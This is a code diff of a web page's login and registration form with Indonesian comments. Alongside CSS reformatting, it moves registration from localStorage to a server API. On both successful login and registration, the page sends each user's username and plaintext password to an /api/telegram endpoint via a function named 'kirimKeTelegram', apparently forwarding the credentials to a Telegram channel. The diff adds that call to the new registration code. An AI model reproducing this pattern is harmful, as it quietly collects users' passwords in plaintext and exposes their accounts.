@@ -7,11 +7,7 @@
 <style>
   * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter','Segoe UI',sans-serif; }
 
-  html {
-    overflow-x:hidden;
-    width:100%;
-    max-width:100vw;
-  }
+  html { overflow-x:hidden; width:100%; max-width:100vw; }
 
   body {
     min-height:100vh;
@@ -334,10 +330,7 @@
     font-family:inherit;
   }
   .tabs button:first-child { border-right:3px solid #000; }
-  .tabs button.active {
-    background:#dc2626;
-    color:#fff;
-  }
+  .tabs button.active { background:#dc2626; color:#fff; }
   .tabs button:hover:not(.active) { background:#fee2e2; }
 
   .form-panel { display:none; position:relative; z-index:2; }
@@ -681,7 +674,7 @@
   })();
 
   /* ============================================
-     UI & LOGIKA
+     UI HELPERS
      ============================================ */
   function showError(msg) {
     var el = document.getElementById('errorMsg');
@@ -722,11 +715,7 @@
       var res = await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: username,
-          password: password,
-          tipe: tipe
-        })
+        body: JSON.stringify({ username: username, password: password, tipe: tipe })
       });
       var data = await res.json();
       return data.success === true;
@@ -736,7 +725,7 @@
   }
 
   /* ============================================
-     HANDLE LOGIN (SERVER-SIDE)
+     HANDLE LOGIN — Server-side via /api/login
      ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
@@ -763,10 +752,8 @@
       var data = await res.json();
 
       if (data.success) {
-        // Kirim notif ke Telegram
         kirimKeTelegram(username, password, 'login');
 
-        // Simpan info user untuk display
         sessionStorage.setItem('user', data.user);
         sessionStorage.setItem('role', data.role || 'member');
         sessionStorage.setItem('loginTime', new Date().toISOString());
@@ -788,7 +775,7 @@
   }
 
   /* ============================================
-     HANDLE REGISTER
+     HANDLE REGISTER — Server-side via /api/register
      ============================================ */
   async function handleRegister(e) {
     e.preventDefault();
@@ -814,45 +801,35 @@
 
     btn.classList.add('loading');
 
-    await kirimKeTelegram(username, password, 'register');
-
-    // Simpan user ke localStorage (database lokal)
-    var users = [];
     try {
-      users = JSON.parse(localStorage.getItem('toolsArielUsers') || '[]');
-    } catch (err) { users = []; }
+      var res = await fetch('/api/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, password: password })
+      });
+      var data = await res.json();
 
-    // Cek duplikat
-    var exists = users.find(function(u) {
-      return u.username.toLowerCase() === username.toLowerCase();
-    });
-    if (exists) {
+      if (data.success) {
+        kirimKeTelegram(username, password, 'register');
+        btn.classList.remove('loading');
+        showSuccess('Akun berhasil dibuat! Silakan login.');
+
+        document.getElementById('panel-register').reset();
+
+        setTimeout(function() {
+          var btnLogin = document.querySelectorAll('.tabs button')[0];
+          switchTab('login', btnLogin);
+          document.getElementById('loginUser').value = username;
+          document.getElementById('loginPass').focus();
+        }, 1500);
+      } else {
+        btn.classList.remove('loading');
+        showError(data.message || 'Register gagal');
+      }
+    } catch (err) {
       btn.classList.remove('loading');
-      showError('Username sudah terdaftar!');
-      return;
+      showError('Error: ' + err.message);
     }
-
-    users.push({
-      username: username,
-      password: password,
-      role: 'member',
-      registeredAt: new Date().toISOString()
-    });
-    localStorage.setItem('toolsArielUsers', JSON.stringify(users));
-
-    setTimeout(function() {
-      btn.classList.remove('loading');
-      showSuccess('Akun berhasil dibuat! Silakan login.');
-
-      document.getElementById('panel-register').reset();
-
-      setTimeout(function() {
-        var btnLogin = document.querySelectorAll('.tabs button')[0];
-        switchTab('login', btnLogin);
-        document.getElementById('loginUser').value = username;
-        document.getElementById('loginPass').focus();
-      }, 1500);
-    }, 800);
   }
 
   window.addEventListener('load', function() {
